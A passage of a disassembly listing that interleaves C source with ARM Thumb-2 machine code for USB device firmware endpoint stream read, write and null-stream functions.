 800350c:	bf28      	it	cs
 800350e:	4613      	movcs	r3, r2
 8003510:	82fb      	strh	r3, [r7, #22]
			SwapCopy((void *)((uint32_t)ep->InBuffer + (uint32_t)ep->InBytesAvailable),(void *)((uint32_t)Buffer + (uint32_t)BytesTransfered), Bytes);
 8003512:	69bb      	ldr	r3, [r7, #24]
 8003514:	69db      	ldr	r3, [r3, #28]
 8003516:	461a      	mov	r2, r3
 8003518:	69bb      	ldr	r3, [r7, #24]
 800351a:	699b      	ldr	r3, [r3, #24]
 800351c:	4413      	add	r3, r2
 800351e:	4618      	mov	r0, r3
 8003520:	8bfa      	ldrh	r2, [r7, #30]
 8003522:	68fb      	ldr	r3, [r7, #12]
 8003524:	4413      	add	r3, r2
 8003526:	4619      	mov	r1, r3
 8003528:	8afb      	ldrh	r3, [r7, #22]
 800352a:	461a      	mov	r2, r3
 800352c:	f7ff ff94 	bl	8003458 <SwapCopy>
			ep->InBytesAvailable += Bytes;
 8003530:	69bb      	ldr	r3, [r7, #24]
 8003532:	699a      	ldr	r2, [r3, #24]
 8003534:	8afb      	ldrh	r3, [r7, #22]
 8003536:	441a      	add	r2, r3
 8003538:	69bb      	ldr	r3, [r7, #24]
 800353a:	619a      	str	r2, [r3, #24]
			BytesTransfered += Bytes;
 800353c:	8bfa      	ldrh	r2, [r7, #30]
 800353e:	8afb      	ldrh	r3, [r7, #22]
 8003540:	4413      	add	r3, r2
 8003542:	83fb      	strh	r3, [r7, #30]
			Length -= Bytes;
 8003544:	897a      	ldrh	r2, [r7, #10]
 8003546:	8afb      	ldrh	r3, [r7, #22]
 8003548:	1ad3      	subs	r3, r2, r3
 800354a:	817b      	strh	r3, [r7, #10]
 800354c:	e012      	b.n	8003574 <Endpoint_Write_Stream_BE+0xd4>
		}
		else {
			Endpoint_ClearIN();
 800354e:	f7ff fccb 	bl	8002ee8 <Endpoint_ClearIN>
			if (BytesProcessed!=NULL) {
 8003552:	687b      	ldr	r3, [r7, #4]
 8003554:	2b00      	cmp	r3, #0
 8003556:	d004      	beq.n	8003562 <Endpoint_Write_Stream_BE+0xc2>
				*BytesProcessed = BytesTransfered;
 8003558:	687b      	ldr	r3, [r7, #4]
 800355a:	8bfa      	ldrh	r2, [r7, #30]
 800355c:	801a      	strh	r2, [r3, #0]
				return ENDPOINT_RWSTREAM_IncompleteTransfer;
 800355e:	2305      	movs	r3, #5
 8003560:	e00c      	b.n	800357c <Endpoint_Write_Stream_BE+0xdc>
			}

			if ((ErrorCode = Endpoint_WaitUntilReady()) != 0) {
 8003562:	f7ff fbe3 	bl	8002d2c <Endpoint_WaitUntilReady>
 8003566:	4603      	mov	r3, r0
 8003568:	757b      	strb	r3, [r7, #21]
 800356a:	7d7b      	ldrb	r3, [r7, #21]
 800356c:	2b00      	cmp	r3, #0
 800356e:	d001      	beq.n	8003574 <Endpoint_Write_Stream_BE+0xd4>
				return ErrorCode;
 8003570:	7d7b      	ldrb	r3, [r7, #21]
 8003572:	e003      	b.n	800357c <Endpoint_Write_Stream_BE+0xdc>
	while (Length) {
 8003574:	897b      	ldrh	r3, [r7, #10]
 8003576:	2b00      	cmp	r3, #0
 8003578:	d1b4      	bne.n	80034e4 <Endpoint_Write_Stream_BE+0x44>
			}


		}
	}
	return ENDPOINT_RWSTREAM_NoError;
 800357a:	2300      	movs	r3, #0
}
 800357c:	4618      	mov	r0, r3
 800357e:	3720      	adds	r7, #32
 8003580:	46bd      	mov	sp, r7
 8003582:	bd80      	pop	{r7, pc}
 8003584:	2000070c 	.word	0x2000070c

08003588 <Endpoint_Read_Stream_LE>:

uint8_t	Endpoint_Read_Stream_LE (void *const Buffer, uint16_t Length, uint16_t *const BytesProcessed) {
 8003588:	b580      	push	{r7, lr}
 800358a:	b088      	sub	sp, #32
 800358c:	af00      	add	r7, sp, #0
 800358e:	60f8      	str	r0, [r7, #12]
 8003590:	460b      	mov	r3, r1
 8003592:	607a      	str	r2, [r7, #4]
 8003594:	817b      	strh	r3, [r7, #10]
	USBD_Endpoint_t* ep = &device.Endpoints[device.CurrentEndpoint];
 8003596:	4b37      	ldr	r3, [pc, #220]	; (8003674 <Endpoint_Read_Stream_LE+0xec>)
 8003598:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 800359c:	461a      	mov	r2, r3
 800359e:	232c      	movs	r3, #44	; 0x2c
 80035a0:	fb02 f303 	mul.w	r3, r2, r3
 80035a4:	4a33      	ldr	r2, [pc, #204]	; (8003674 <Endpoint_Read_Stream_LE+0xec>)
 80035a6:	4413      	add	r3, r2
 80035a8:	3304      	adds	r3, #4
 80035aa:	61bb      	str	r3, [r7, #24]
	uint16_t Bytes = 0;
 80035ac:	2300      	movs	r3, #0
 80035ae:	82fb      	strh	r3, [r7, #22]
	uint16_t BytesTransfered = 0;
 80035b0:	2300      	movs	r3, #0
 80035b2:	83fb      	strh	r3, [r7, #30]
	uint8_t ErrorCode;

	if (BytesProcessed!=NULL) {
 80035b4:	687b      	ldr	r3, [r7, #4]
 80035b6:	2b00      	cmp	r3, #0
 80035b8:	d053      	beq.n	8003662 <Endpoint_Read_Stream_LE+0xda>
		Length -= *BytesProcessed;
 80035ba:	687b      	ldr	r3, [r7, #4]
 80035bc:	881b      	ldrh	r3, [r3, #0]
 80035be:	897a      	ldrh	r2, [r7, #10]
 80035c0:	1ad3      	subs	r3, r2, r3
 80035c2:	817b      	strh	r3, [r7, #10]
		BytesTransfered = *BytesProcessed;
 80035c4:	687b      	ldr	r3, [r7, #4]
 80035c6:	881b      	ldrh	r3, [r3, #0]
 80035c8:	83fb      	strh	r3, [r7, #30]
	}

	while (Length) {
 80035ca:	e04a      	b.n	8003662 <Endpoint_Read_Stream_LE+0xda>
		if (ep->OutInUse)
 80035cc:	69bb      	ldr	r3, [r7, #24]
 80035ce:	685b      	ldr	r3, [r3, #4]
 80035d0:	f3c3 03c0 	ubfx	r3, r3, #3, #1
 80035d4:	b2db      	uxtb	r3, r3
 80035d6:	2b00      	cmp	r3, #0
 80035d8:	d000      	beq.n	80035dc <Endpoint_Read_Stream_LE+0x54>
			continue;
 80035da:	e042      	b.n	8003662 <Endpoint_Read_Stream_LE+0xda>
		if (Endpoint_IsReadWriteAllowed()) {
 80035dc:	f7ff fcfc 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 80035e0:	4603      	mov	r3, r0
 80035e2:	2b00      	cmp	r3, #0
 80035e4:	d02a      	beq.n	800363c <Endpoint_Read_Stream_LE+0xb4>
			Bytes = ep->OutBytesAvailable  > Length ? Length : ep->OutBytesAvailable;
 80035e6:	69bb      	ldr	r3, [r7, #24]
 80035e8:	689a      	ldr	r2, [r3, #8]
 80035ea:	897b      	ldrh	r3, [r7, #10]
 80035ec:	4293      	cmp	r3, r2
 80035ee:	bf28      	it	cs
 80035f0:	4613      	movcs	r3, r2
 80035f2:	82fb      	strh	r3, [r7, #22]
			MEMCPY((void *)((uint32_t)Buffer + (uint32_t)BytesTransfered), (void *)((uint32_t)ep->OutBuffer + (uint32_t)ep->OutOffset), Bytes);
 80035f4:	8bfa      	ldrh	r2, [r7, #30]
 80035f6:	68fb      	ldr	r3, [r7, #12]
 80035f8:	4413      	add	r3, r2
 80035fa:	4618      	mov	r0, r3
 80035fc:	69bb      	ldr	r3, [r7, #24]
 80035fe:	691b      	ldr	r3, [r3, #16]
 8003600:	461a      	mov	r2, r3
 8003602:	69bb      	ldr	r3, [r7, #24]
 8003604:	68db      	ldr	r3, [r3, #12]
 8003606:	4413      	add	r3, r2
 8003608:	4619      	mov	r1, r3
 800360a:	8afb      	ldrh	r3, [r7, #22]
 800360c:	461a      	mov	r2, r3
 800360e:	f7ff fb2b 	bl	8002c68 <thumb2_memcpy>
			ep->OutBytesAvailable -= Bytes;
 8003612:	69bb      	ldr	r3, [r7, #24]
 8003614:	689a      	ldr	r2, [r3, #8]
 8003616:	8afb      	ldrh	r3, [r7, #22]
 8003618:	1ad2      	subs	r2, r2, r3
 800361a:	69bb      	ldr	r3, [r7, #24]
 800361c:	609a      	str	r2, [r3, #8]
			ep->OutOffset += Bytes;
 800361e:	69bb      	ldr	r3, [r7, #24]
 8003620:	68da      	ldr	r2, [r3, #12]
 8003622:	8afb      	ldrh	r3, [r7, #22]
 8003624:	441a      	add	r2, r3
 8003626:	69bb      	ldr	r3, [r7, #24]
 8003628:	60da      	str	r2, [r3, #12]
			BytesTransfered += Bytes;
 800362a:	8bfa      	ldrh	r2, [r7, #30]
 800362c:	8afb      	ldrh	r3, [r7, #22]
 800362e:	4413      	add	r3, r2
 8003630:	83fb      	strh	r3, [r7, #30]
			Length -= Bytes;
 8003632:	897a      	ldrh	r2, [r7, #10]
 8003634:	8afb      	ldrh	r3, [r7, #22]
 8003636:	1ad3      	subs	r3, r2, r3
 8003638:	817b      	strh	r3, [r7, #10]
 800363a:	e012      	b.n	8003662 <Endpoint_Read_Stream_LE+0xda>
		}
		else {
			Endpoint_ClearOUT();
 800363c:	f7ff fc08 	bl	8002e50 <Endpoint_ClearOUT>
			if (BytesProcessed!=NULL) {
 8003640:	687b      	ldr	r3, [r7, #4]
 8003642:	2b00      	cmp	r3, #0
 8003644:	d004      	beq.n	8003650 <Endpoint_Read_Stream_LE+0xc8>
				*BytesProcessed = BytesTransfered;
 8003646:	687b      	ldr	r3, [r7, #4]
 8003648:	8bfa      	ldrh	r2, [r7, #30]
 800364a:	801a      	strh	r2, [r3, #0]
				return ENDPOINT_RWSTREAM_IncompleteTransfer;
 800364c:	2305      	movs	r3, #5
 800364e:	e00c      	b.n	800366a <Endpoint_Read_Stream_LE+0xe2>
			}

			if ((ErrorCode = Endpoint_WaitUntilReady()) != 0) {
 8003650:	f7ff fb6c 	bl	8002d2c <Endpoint_WaitUntilReady>
 8003654:	4603      	mov	r3, r0
 8003656:	757b      	strb	r3, [r7, #21]
 8003658:	7d7b      	ldrb	r3, [r7, #21]
 800365a:	2b00      	cmp	r3, #0
 800365c:	d001      	beq.n	8003662 <Endpoint_Read_Stream_LE+0xda>
				return ErrorCode;
 800365e:	7d7b      	ldrb	r3, [r7, #21]
 8003660:	e003      	b.n	800366a <Endpoint_Read_Stream_LE+0xe2>
	while (Length) {
 8003662:	897b      	ldrh	r3, [r7, #10]
 8003664:	2b00      	cmp	r3, #0
 8003666:	d1b1      	bne.n	80035cc <Endpoint_Read_Stream_LE+0x44>
			}

		}
	}
	return ENDPOINT_RWSTREAM_NoError;
 8003668:	2300      	movs	r3, #0
}
 800366a:	4618      	mov	r0, r3
 800366c:	3720      	adds	r7, #32
 800366e:	46bd      	mov	sp, r7
 8003670:	bd80      	pop	{r7, pc}
 8003672:	bf00      	nop
 8003674:	2000070c 	.word	0x2000070c

08003678 <Endpoint_Read_Stream_BE>:

uint8_t	Endpoint_Read_Stream_BE (void *const Buffer, uint16_t Length, uint16_t *const BytesProcessed) {
 8003678:	b580      	push	{r7, lr}
 800367a:	b088      	sub	sp, #32
 800367c:	af00      	add	r7, sp, #0
 800367e:	60f8      	str	r0, [r7, #12]
 8003680:	460b      	mov	r3, r1
 8003682:	607a      	str	r2, [r7, #4]
 8003684:	817b      	strh	r3, [r7, #10]
	USBD_Endpoint_t* ep = &device.Endpoints[device.CurrentEndpoint];
 8003686:	4b37      	ldr	r3, [pc, #220]	; (8003764 <Endpoint_Read_Stream_BE+0xec>)
 8003688:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 800368c:	461a      	mov	r2, r3
 800368e:	232c      	movs	r3, #44	; 0x2c
 8003690:	fb02 f303 	mul.w	r3, r2, r3
 8003694:	4a33      	ldr	r2, [pc, #204]	; (8003764 <Endpoint_Read_Stream_BE+0xec>)
 8003696:	4413      	add	r3, r2
 8003698:	3304      	adds	r3, #4
 800369a:	61bb      	str	r3, [r7, #24]
	uint16_t Bytes = 0;
 800369c:	2300      	movs	r3, #0
 800369e:	82fb      	strh	r3, [r7, #22]
	uint16_t BytesTransfered = 0;
 80036a0:	2300      	movs	r3, #0
 80036a2:	83fb      	strh	r3, [r7, #30]
	uint8_t ErrorCode;

	if (BytesProcessed!=NULL) {
 80036a4:	687b      	ldr	r3, [r7, #4]
 80036a6:	2b00      	cmp	r3, #0
 80036a8:	d053      	beq.n	8003752 <Endpoint_Read_Stream_BE+0xda>
		Length -= *BytesProcessed;
 80036aa:	687b      	ldr	r3, [r7, #4]
 80036ac:	881b      	ldrh	r3, [r3, #0]
 80036ae:	897a      	ldrh	r2, [r7, #10]
 80036b0:	1ad3      	subs	r3, r2, r3
 80036b2:	817b      	strh	r3, [r7, #10]
		BytesTransfered = *BytesProcessed;
 80036b4:	687b      	ldr	r3, [r7, #4]
 80036b6:	881b      	ldrh	r3, [r3, #0]
 80036b8:	83fb      	strh	r3, [r7, #30]
	}

	while (Length) {
 80036ba:	e04a      	b.n	8003752 <Endpoint_Read_Stream_BE+0xda>
		if (ep->InInUse)
 80036bc:	69bb      	ldr	r3, [r7, #24]
 80036be:	685b      	ldr	r3, [r3, #4]
 80036c0:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80036c4:	b2db      	uxtb	r3, r3
 80036c6:	2b00      	cmp	r3, #0
 80036c8:	d000      	beq.n	80036cc <Endpoint_Read_Stream_BE+0x54>
			continue;
 80036ca:	e042      	b.n	8003752 <Endpoint_Read_Stream_BE+0xda>
		if (Endpoint_IsReadWriteAllowed()) {
 80036cc:	f7ff fc84 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 80036d0:	4603      	mov	r3, r0
 80036d2:	2b00      	cmp	r3, #0
 80036d4:	d02a      	beq.n	800372c <Endpoint_Read_Stream_BE+0xb4>
			Bytes = ep->OutBytesAvailable  > Length ? Length : ep->OutBytesAvailable;
 80036d6:	69bb      	ldr	r3, [r7, #24]
 80036d8:	689a      	ldr	r2, [r3, #8]
 80036da:	897b      	ldrh	r3, [r7, #10]
 80036dc:	4293      	cmp	r3, r2
 80036de:	bf28      	it	cs
 80036e0:	4613      	movcs	r3, r2
 80036e2:	82fb      	strh	r3, [r7, #22]
			SwapCopy((void *)((uint32_t)Buffer + (uint32_t)BytesTransfered), (void *)((uint32_t)ep->OutBuffer + (uint32_t)ep->OutOffset), Bytes);
 80036e4:	8bfa      	ldrh	r2, [r7, #30]
 80036e6:	68fb      	ldr	r3, [r7, #12]
 80036e8:	4413      	add	r3, r2
 80036ea:	4618      	mov	r0, r3
 80036ec:	69bb      	ldr	r3, [r7, #24]
 80036ee:	691b      	ldr	r3, [r3, #16]
 80036f0:	461a      	mov	r2, r3
 80036f2:	69bb      	ldr	r3, [r7, #24]
 80036f4:	68db      	ldr	r3, [r3, #12]
 80036f6:	4413      	add	r3, r2
 80036f8:	4619      	mov	r1, r3
 80036fa:	8afb      	ldrh	r3, [r7, #22]
 80036fc:	461a      	mov	r2, r3
 80036fe:	f7ff feab 	bl	8003458 <SwapCopy>
			ep->OutBytesAvailable -= Bytes;
 8003702:	69bb      	ldr	r3, [r7, #24]
 8003704:	689a      	ldr	r2, [r3, #8]
 8003706:	8afb      	ldrh	r3, [r7, #22]
 8003708:	1ad2      	subs	r2, r2, r3
 800370a:	69bb      	ldr	r3, [r7, #24]
 800370c:	609a      	str	r2, [r3, #8]
			ep->OutOffset += Bytes;
 800370e:	69bb      	ldr	r3, [r7, #24]
 8003710:	68da      	ldr	r2, [r3, #12]
 8003712:	8afb      	ldrh	r3, [r7, #22]
 8003714:	441a      	add	r2, r3
 8003716:	69bb      	ldr	r3, [r7, #24]
 8003718:	60da      	str	r2, [r3, #12]
			BytesTransfered += Bytes;
 800371a:	8bfa      	ldrh	r2, [r7, #30]
 800371c:	8afb      	ldrh	r3, [r7, #22]
 800371e:	4413      	add	r3, r2
 8003720:	83fb      	strh	r3, [r7, #30]
			Length -= Bytes;
 8003722:	897a      	ldrh	r2, [r7, #10]
 8003724:	8afb      	ldrh	r3, [r7, #22]
 8003726:	1ad3      	subs	r3, r2, r3
 8003728:	817b      	strh	r3, [r7, #10]
 800372a:	e012      	b.n	8003752 <Endpoint_Read_Stream_BE+0xda>
		}
		else {
			Endpoint_ClearOUT();
 800372c:	f7ff fb90 	bl	8002e50 <Endpoint_ClearOUT>
			if (BytesProcessed!=NULL) {
 8003730:	687b      	ldr	r3, [r7, #4]
 8003732:	2b00      	cmp	r3, #0
 8003734:	d004      	beq.n	8003740 <Endpoint_Read_Stream_BE+0xc8>
				*BytesProcessed = BytesTransfered;
 8003736:	687b      	ldr	r3, [r7, #4]
 8003738:	8bfa      	ldrh	r2, [r7, #30]
 800373a:	801a      	strh	r2, [r3, #0]
				return ENDPOINT_RWSTREAM_IncompleteTransfer;
 800373c:	2305      	movs	r3, #5
 800373e:	e00c      	b.n	800375a <Endpoint_Read_Stream_BE+0xe2>
			}

			if ((ErrorCode = Endpoint_WaitUntilReady()) != 0) {
 8003740:	f7ff faf4 	bl	8002d2c <Endpoint_WaitUntilReady>
 8003744:	4603      	mov	r3, r0
 8003746:	757b      	strb	r3, [r7, #21]
 8003748:	7d7b      	ldrb	r3, [r7, #21]
 800374a:	2b00      	cmp	r3, #0
 800374c:	d001      	beq.n	8003752 <Endpoint_Read_Stream_BE+0xda>
				return ErrorCode;
 800374e:	7d7b      	ldrb	r3, [r7, #21]
 8003750:	e003      	b.n	800375a <Endpoint_Read_Stream_BE+0xe2>
	while (Length) {
 8003752:	897b      	ldrh	r3, [r7, #10]
 8003754:	2b00      	cmp	r3, #0
 8003756:	d1b1      	bne.n	80036bc <Endpoint_Read_Stream_BE+0x44>
			}


		}
	}
	return ENDPOINT_RWSTREAM_NoError;
 8003758:	2300      	movs	r3, #0
}
 800375a:	4618      	mov	r0, r3
 800375c:	3720      	adds	r7, #32
 800375e:	46bd      	mov	sp, r7
 8003760:	bd80      	pop	{r7, pc}
 8003762:	bf00      	nop
 8003764:	2000070c 	.word	0x2000070c

08003768 <Endpoint_Write_Control_Stream_LE>:

uint8_t	Endpoint_Write_Control_Stream_LE (const void *const Buffer, uint16_t Length) {
 8003768:	b580      	push	{r7, lr}
 800376a:	b084      	sub	sp, #16
 800376c:	af00      	add	r7, sp, #0
 800376e:	6078      	str	r0, [r7, #4]
 8003770:	460b      	mov	r3, r1
 8003772:	807b      	strh	r3, [r7, #2]
	USBD_Endpoint_t *EndPoint = &device.Endpoints[0];
 8003774:	4b17      	ldr	r3, [pc, #92]	; (80037d4 <Endpoint_Write_Control_Stream_LE+0x6c>)
 8003776:	60bb      	str	r3, [r7, #8]
	uint16_t Bytes;

	while (Length) {
 8003778:	e024      	b.n	80037c4 <Endpoint_Write_Control_Stream_LE+0x5c>
		if (!EndPoint->InInUse) {
 800377a:	68bb      	ldr	r3, [r7, #8]
 800377c:	685b      	ldr	r3, [r3, #4]
 800377e:	f3c3 1300 	ubfx	r3, r3, #4, #1
 8003782:	b2db      	uxtb	r3, r3
 8003784:	2b00      	cmp	r3, #0
 8003786:	d11d      	bne.n	80037c4 <Endpoint_Write_Control_Stream_LE+0x5c>
			if (EndPoint->InBufferLength > Length) {
 8003788:	68bb      	ldr	r3, [r7, #8]
 800378a:	6a1a      	ldr	r2, [r3, #32]
 800378c:	887b      	ldrh	r3, [r7, #2]
 800378e:	429a      	cmp	r2, r3
 8003790:	d902      	bls.n	8003798 <Endpoint_Write_Control_Stream_LE+0x30>
				Bytes = Length;
 8003792:	887b      	ldrh	r3, [r7, #2]
 8003794:	81fb      	strh	r3, [r7, #14]
 8003796:	e002      	b.n	800379e <Endpoint_Write_Control_Stream_LE+0x36>
			} else {
				Bytes = EndPoint->InBufferLength;
 8003798:	68bb      	ldr	r3, [r7, #8]
 800379a:	6a1b      	ldr	r3, [r3, #32]
 800379c:	81fb      	strh	r3, [r7, #14]
			}
			MEMCPY(EndPoint->InBuffer,Buffer,Bytes);
 800379e:	68bb      	ldr	r3, [r7, #8]
 80037a0:	69db      	ldr	r3, [r3, #28]
 80037a2:	89fa      	ldrh	r2, [r7, #14]
 80037a4:	6879      	ldr	r1, [r7, #4]
 80037a6:	4618      	mov	r0, r3
 80037a8:	f7ff fa5e 	bl	8002c68 <thumb2_memcpy>
			EndPoint->InBytesAvailable += Bytes;
 80037ac:	68bb      	ldr	r3, [r7, #8]
 80037ae:	699a      	ldr	r2, [r3, #24]
 80037b0:	89fb      	ldrh	r3, [r7, #14]
 80037b2:	441a      	add	r2, r3
 80037b4:	68bb      	ldr	r3, [r7, #8]
 80037b6:	619a      	str	r2, [r3, #24]
			Length -= Bytes;
 80037b8:	887a      	ldrh	r2, [r7, #2]
 80037ba:	89fb      	ldrh	r3, [r7, #14]
 80037bc:	1ad3      	subs	r3, r2, r3
 80037be:	807b      	strh	r3, [r7, #2]

			Endpoint_ClearIN();
 80037c0:	f7ff fb92 	bl	8002ee8 <Endpoint_ClearIN>
	while (Length) {
 80037c4:	887b      	ldrh	r3, [r7, #2]
 80037c6:	2b00      	cmp	r3, #0
 80037c8:	d1d7      	bne.n	800377a <Endpoint_Write_Control_Stream_LE+0x12>
		}
	}
	return ENDPOINT_RWCSTREAM_NoError;
 80037ca:	2300      	movs	r3, #0
}
 80037cc:	4618      	mov	r0, r3
 80037ce:	3710      	adds	r7, #16
 80037d0:	46bd      	mov	sp, r7
 80037d2:	bd80      	pop	{r7, pc}
 80037d4:	20000710 	.word	0x20000710

080037d8 <Endpoint_Write_Control_Stream_BE>:

uint8_t	Endpoint_Write_Control_Stream_BE (const void *const Buffer, uint16_t Length) {
 80037d8:	b580      	push	{r7, lr}
 80037da:	b082      	sub	sp, #8
 80037dc:	af00      	add	r7, sp, #0
 80037de:	6078      	str	r0, [r7, #4]
 80037e0:	460b      	mov	r3, r1
 80037e2:	807b      	strh	r3, [r7, #2]
	return Endpoint_Write_Control_Stream_LE(Buffer,Length);
 80037e4:	887b      	ldrh	r3, [r7, #2]
 80037e6:	4619      	mov	r1, r3
 80037e8:	6878      	ldr	r0, [r7, #4]
 80037ea:	f7ff ffbd 	bl	8003768 <Endpoint_Write_Control_Stream_LE>
 80037ee:	4603      	mov	r3, r0
}
 80037f0:	4618      	mov	r0, r3
 80037f2:	3708      	adds	r7, #8
 80037f4:	46bd      	mov	sp, r7
 80037f6:	bd80      	pop	{r7, pc}

080037f8 <Endpoint_Read_Control_Stream_LE>:

uint8_t	Endpoint_Read_Control_Stream_LE (void *const Buffer, uint16_t Length) {
 80037f8:	b580      	push	{r7, lr}
 80037fa:	b084      	sub	sp, #16
 80037fc:	af00      	add	r7, sp, #0
 80037fe:	6078      	str	r0, [r7, #4]
 8003800:	460b      	mov	r3, r1
 8003802:	807b      	strh	r3, [r7, #2]
	USBD_Endpoint_t *EndPoint = &device.Endpoints[0];
 8003804:	4b15      	ldr	r3, [pc, #84]	; (800385c <Endpoint_Read_Control_Stream_LE+0x64>)
 8003806:	60fb      	str	r3, [r7, #12]
	uint16_t Bytes;

	while (Length) {
 8003808:	e020      	b.n	800384c <Endpoint_Read_Control_Stream_LE+0x54>
		if (EndPoint->IsOutRecieved) {
 800380a:	68fb      	ldr	r3, [r7, #12]
 800380c:	685b      	ldr	r3, [r3, #4]
 800380e:	f3c3 1340 	ubfx	r3, r3, #5, #1
 8003812:	b2db      	uxtb	r3, r3
 8003814:	2b00      	cmp	r3, #0
 8003816:	d019      	beq.n	800384c <Endpoint_Read_Control_Stream_LE+0x54>
			Bytes = EndPoint->OutBytesAvailable > Length
 8003818:	68fb      	ldr	r3, [r7, #12]
 800381a:	689a      	ldr	r2, [r3, #8]
 800381c:	887b      	ldrh	r3, [r7, #2]
					? Length : EndPoint->OutBytesAvailable;
 800381e:	4293      	cmp	r3, r2
 8003820:	bf28      	it	cs
 8003822:	4613      	movcs	r3, r2
			Bytes = EndPoint->OutBytesAvailable > Length
 8003824:	817b      	strh	r3, [r7, #10]
			MEMCPY(Buffer,EndPoint->OutBuffer,Bytes);
 8003826:	68fb      	ldr	r3, [r7, #12]
 8003828:	691b      	ldr	r3, [r3, #16]
 800382a:	897a      	ldrh	r2, [r7, #10]
 800382c:	4619      	mov	r1, r3
 800382e:	6878      	ldr	r0, [r7, #4]
 8003830:	f7ff fa1a 	bl	8002c68 <thumb2_memcpy>
			EndPoint->OutBytesAvailable -= Bytes;
 8003834:	68fb      	ldr	r3, [r7, #12]
 8003836:	689a      	ldr	r2, [r3, #8]
 8003838:	897b      	ldrh	r3, [r7, #10]
 800383a:	1ad2      	subs	r2, r2, r3
 800383c:	68fb      	ldr	r3, [r7, #12]
 800383e:	609a      	str	r2, [r3, #8]
			Length -= Bytes;
 8003840:	887a      	ldrh	r2, [r7, #2]
 8003842:	897b      	ldrh	r3, [r7, #10]
 8003844:	1ad3      	subs	r3, r2, r3
 8003846:	807b      	strh	r3, [r7, #2]

			Endpoint_ClearOUT();
 8003848:	f7ff fb02 	bl	8002e50 <Endpoint_ClearOUT>
	while (Length) {
 800384c:	887b      	ldrh	r3, [r7, #2]
 800384e:	2b00      	cmp	r3, #0
 8003850:	d1db      	bne.n	800380a <Endpoint_Read_Control_Stream_LE+0x12>
		}
	}
	return ENDPOINT_RWCSTREAM_NoError;
 8003852:	2300      	movs	r3, #0
}
 8003854:	4618      	mov	r0, r3
 8003856:	3710      	adds	r7, #16
 8003858:	46bd      	mov	sp, r7
 800385a:	bd80      	pop	{r7, pc}
 800385c:	20000710 	.word	0x20000710

08003860 <Endpoint_Read_Control_Stream_BE>:

uint8_t	Endpoint_Read_Control_Stream_BE (void *const Buffer, uint16_t Length) {
 8003860:	b580      	push	{r7, lr}
 8003862:	b082      	sub	sp, #8
 8003864:	af00      	add	r7, sp, #0
 8003866:	6078      	str	r0, [r7, #4]
 8003868:	460b      	mov	r3, r1
 800386a:	807b      	strh	r3, [r7, #2]
	return Endpoint_Read_Control_Stream_LE(Buffer,Length);
 800386c:	887b      	ldrh	r3, [r7, #2]
 800386e:	4619      	mov	r1, r3
 8003870:	6878      	ldr	r0, [r7, #4]
 8003872:	f7ff ffc1 	bl	80037f8 <Endpoint_Read_Control_Stream_LE>
 8003876:	4603      	mov	r3, r0
}
 8003878:	4618      	mov	r0, r3
 800387a:	3708      	adds	r7, #8
 800387c:	46bd      	mov	sp, r7
 800387e:	bd80      	pop	{r7, pc}

08003880 <Endpoint_Null_Stream>:

uint8_t Endpoint_Null_Stream(uint16_t Length,
								 uint16_t* const BytesProcessed) {
 8003880:	b580      	push	{r7, lr}
 8003882:	b086      	sub	sp, #24
 8003884:	af00      	add	r7, sp, #0
 8003886:	4603      	mov	r3, r0
 8003888:	6039      	str	r1, [r7, #0]
 800388a:	80fb      	strh	r3, [r7, #6]
	USBD_Endpoint_t* ep = &device.Endpoints[device.CurrentEndpoint];
 800388c:	4b32      	ldr	r3, [pc, #200]	; (8003958 <Endpoint_Null_Stream+0xd8>)
 800388e:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 8003892:	461a      	mov	r2, r3
 8003894:	232c      	movs	r3, #44	; 0x2c
 8003896:	fb02 f303 	mul.w	r3, r2, r3
 800389a:	4a2f      	ldr	r2, [pc, #188]	; (8003958 <Endpoint_Null_Stream+0xd8>)
 800389c:	4413      	add	r3, r2
 800389e:	3304      	adds	r3, #4
 80038a0:	613b      	str	r3, [r7, #16]
		uint16_t Bytes = 0;
 80038a2:	2300      	movs	r3, #0
 80038a4:	81fb      	strh	r3, [r7, #14]
		uint16_t BytesTransfered = 0;
 80038a6:	2300      	movs	r3, #0
 80038a8:	82fb      	strh	r3, [r7, #22]
		uint8_t ErrorCode;

		if (BytesProcessed!=NULL) {
 80038aa:	683b      	ldr	r3, [r7, #0]
 80038ac:	2b00      	cmp	r3, #0
 80038ae:	d04b      	beq.n	8003948 <Endpoint_Null_Stream+0xc8>
			Length -= *BytesProcessed;
 80038b0:	683b      	ldr	r3, [r7, #0]
 80038b2:	881b      	ldrh	r3, [r3, #0]
 80038b4:	88fa      	ldrh	r2, [r7, #6]
 80038b6:	1ad3      	subs	r3, r2, r3
 80038b8:	80fb      	strh	r3, [r7, #6]
			BytesTransfered = *BytesProcessed;
 80038ba:	683b      	ldr	r3, [r7, #0]
 80038bc:	881b      	ldrh	r3, [r3, #0]
 80038be:	82fb      	strh	r3, [r7, #22]
		}

		while (Length) {
 80038c0:	e042      	b.n	8003948 <Endpoint_Null_Stream+0xc8>
			if (ep->InInUse)
 80038c2:	693b      	ldr	r3, [r7, #16]
 80038c4:	685b      	ldr	r3, [r3, #4]
 80038c6:	f3c3 1300 	ubfx	r3, r3, #4, #1
 80038ca:	b2db      	uxtb	r3, r3
 80038cc:	2b00      	cmp	r3, #0
 80038ce:	d000      	beq.n	80038d2 <Endpoint_Null_Stream+0x52>
				continue;
 80038d0:	e03a      	b.n	8003948 <Endpoint_Null_Stream+0xc8>
			if (Endpoint_IsReadWriteAllowed()) {
 80038d2:	f7ff fb81 	bl	8002fd8 <Endpoint_IsReadWriteAllowed>
 80038d6:	4603      	mov	r3, r0
 80038d8:	2b00      	cmp	r3, #0
 80038da:	d022      	beq.n	8003922 <Endpoint_Null_Stream+0xa2>
				Bytes = ep->InBufferLength - ep->InBytesAvailable  > Length ? Length : ep->InBufferLength - ep->InBytesAvailable;
 80038dc:	693b      	ldr	r3, [r7, #16]
 80038de:	6a1a      	ldr	r2, [r3, #32]
 80038e0:	693b      	ldr	r3, [r7, #16]
 80038e2:	699b      	ldr	r3, [r3, #24]
 80038e4:	1ad2      	subs	r2, r2, r3
 80038e6:	88fb      	ldrh	r3, [r7, #6]
 80038e8:	4293      	cmp	r3, r2
 80038ea:	bf28      	it	cs
 80038ec:	4613      	movcs	r3, r2
 80038ee:	81fb      	strh	r3, [r7, #14]
				memset(ep->InBuffer + ep->InBytesAvailable,0x0,Bytes);
 80038f0:	693b      	ldr	r3, [r7, #16]
